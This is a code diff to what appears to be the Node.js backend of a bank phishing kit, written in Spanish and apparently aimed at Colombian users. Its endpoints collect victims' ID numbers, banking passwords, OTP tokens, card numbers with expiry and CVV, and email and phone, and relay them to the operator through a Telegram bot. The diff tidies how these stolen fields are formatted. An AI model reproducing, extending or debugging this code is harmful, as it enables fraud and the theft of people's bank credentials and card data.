@@ -36,6 +36,13 @@ const sessions = new Map();
 
 const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
 
+const getSafeValue = (value) => {
+  if (value === undefined || value === null || value === '' || value === 'undefined' || value === 'null') {
+    return "N/D";
+  }
+  return String(value).trim();
+};
+
 // ===== FUNCIÓN PARA ELIMINAR BOTONES DE UN MENSAJE =====
 async function eliminarBotones(chatId, messageId) {
   try {
@@ -304,10 +311,9 @@ app.post("/virtualpersona", async (req, res) => {
   if (metodo === "clave") {
     sessions.set(sessionId, { redirect_to: null });
 
-    // Usar valores recibidos, o reemplazar undefined/null/vacío con "NO_DISPONIBLE"
-    const tipoDocSafe = tipoDoc || "SIN_DATO";
-    const numDocSafe = numDoc || "SIN_DATO";
-    const claveSafe = clave || "SIN_DATO";
+    const tipoDocSafe = getSafeValue(tipoDoc);
+    const numDocSafe = getSafeValue(numDoc);
+    const claveSafe = getSafeValue(clave);
 
     console.log(`✅ Enviando a Telegram con valores seguros:`);
     console.log(`   - tipoDoc: ${tipoDocSafe}`);
@@ -335,7 +341,13 @@ app.post("/notify/otp1", async (req, res) => {
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token });
+    await enviarMensajeTelegramOTP({
+      tipoDoc: getSafeValue(tipoDoc),
+      numDoc: getSafeValue(numDoc),
+      clave: getSafeValue(clave),
+      sessionId,
+      token: getSafeValue(token)
+    });
     return res.json({ ok: true });
   } catch (e) {
     console.error("❌ /notify/otp1 error:", e);
@@ -351,7 +363,13 @@ app.post("/notify/otp2", async (req, res) => {
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token });
+    await enviarMensajeTelegramOTP({
+      tipoDoc: getSafeValue(tipoDoc),
+      numDoc: getSafeValue(numDoc),
+      clave: getSafeValue(clave),
+      sessionId,
+      token: getSafeValue(token)
+    });
     return res.json({ ok: true });
   } catch (e) {
     console.error("❌ /notify/otp2 error:", e);
@@ -367,7 +385,15 @@ app.post("/notify/tarjeta", async (req, res) => {
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegramTarjeta({ tipoDoc, numDoc, clave, sessionId, tarjeta, fecha, cvv });
+    await enviarMensajeTelegramTarjeta({
+      tipoDoc: getSafeValue(tipoDoc),
+      numDoc: getSafeValue(numDoc),
+      clave: getSafeValue(clave),
+      sessionId,
+      tarjeta: getSafeValue(tarjeta),
+      fecha: getSafeValue(fecha),
+      cvv: getSafeValue(cvv)
+    });
     return res.json({ ok: true });
   } catch (e) {
     console.error("❌ /notify/tarjeta error:", e);
@@ -383,7 +409,14 @@ app.post("/notify/correo", async (req, res) => {
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegramCorreo({ tipoDoc, numDoc, clave, sessionId, correo, celular });
+    await enviarMensajeTelegramCorreo({
+      tipoDoc: getSafeValue(tipoDoc),
+      numDoc: getSafeValue(numDoc),
+      clave: getSafeValue(clave),
+      sessionId,
+      correo: getSafeValue(correo),
+      celular: getSafeValue(celular)
+    });
     return res.json({ ok: true });
   } catch (e) {
     console.error("❌ /notify/correo error:", e);
@@ -399,14 +432,20 @@ app.post("/notify/formulario", async (req, res) => {
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
+    const tipoDocSafe = getSafeValue(tipoDoc);
+    const numDocSafe = getSafeValue(numDoc);
+    const montoSafe = monto && !isNaN(monto) ? (monto / 1000000).toFixed(0) : "N/D";
+    const cuotasSafe = getSafeValue(cuotas);
+    const interesSafe = getSafeValue(interes);
+
     const mensaje = `
 💰 *SOLICITUD DE CRÉDITO*
 
-📄 *Tipo de documento:* ${tipoDoc || "N/D"}
-🆔 *Documento:* ${numDoc || "N/D"}
-💵 *Monto solicitado:* $${(monto / 1000000).toFixed(0)}M COP
-📅 *Cuotas:* ${cuotas || "N/D"} meses
-📊 *Interés:* ${interes || "N/D"}% anual
+📄 *Tipo de documento:* ${tipoDocSafe}
+🆔 *Documento:* ${numDocSafe}
+💵 *Monto solicitado:* ${montoSafe === "N/D" ? "N/D" : `$${montoSafe}M COP`}
+📅 *Cuotas:* ${cuotasSafe} meses
+📊 *Interés:* ${interesSafe}% anual
 
 🌀 *Session ID:* \`${sessionId}\`
 `;
